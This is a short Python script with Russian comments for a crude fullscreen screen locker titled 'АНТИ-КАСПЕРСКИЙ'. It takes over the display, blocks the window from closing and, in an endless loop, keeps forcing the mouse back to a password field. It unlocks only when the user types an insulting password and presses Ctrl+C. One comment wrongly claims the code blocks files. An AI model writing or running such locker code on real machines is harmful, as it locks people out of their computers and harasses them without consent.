from tkinter import Tk,Entry,Label
#простой дизайн
from pyautogui import click, moveTo
#pyautogui(в нашем локере) нужен для блочки файлов
from time import sleep
#замедляет функции pyautogui
def callback(event):
	#делаем переменную глобальную(открытую)
	global k,entry
	if entry.get()=="Андрей лох": k=True
def on_closing():
	click(675, 420)
	moveTo(675, 420)
	root.attributes("-fullscreen",True)
	root.protocol("WM_DELETE_WINDOW", on_closing)
	root.update()
	root.bind('<Control-KeyPress-c>', callback)
root=Tk() #создание окна
root.title("Locker") # заг.название
root.attributes("-fullscreen",True) #расширение под экран
entry=Entry(root,font=1) #поле ввода
entry.place(width=150,height=50,x=600,y=400) #координаты и размеры
label0=Label(root,text="АНТИ-КАСПЕРСКИЙ",font=2) #надпись 1
label0.grid(row=0,column=0) #координаты надписи 1
label1=Label(root,text="Введи пароль или нажми ctrl + c",font='Arial 20') #надпись 2
label1.place(x=470,y=300) #координаты надписи 2
root.update(); sleep(0.2); click(675, 420) #обновление экрана программы(Короче или длинее(1.Если чел испугался и решил взять какую то программу и закрытть наш локер,то у него это не получится я не знаю зачем я это добавил + наверное главное функции этого update ,так как я рукожопый и не смог сделатьлил найти ноорм библиотеку или просто что я рукожопый ОНА НЕ ДАЕт pyautogui давать о себе знать ))
k=False
while k!=True: on_closing()
	
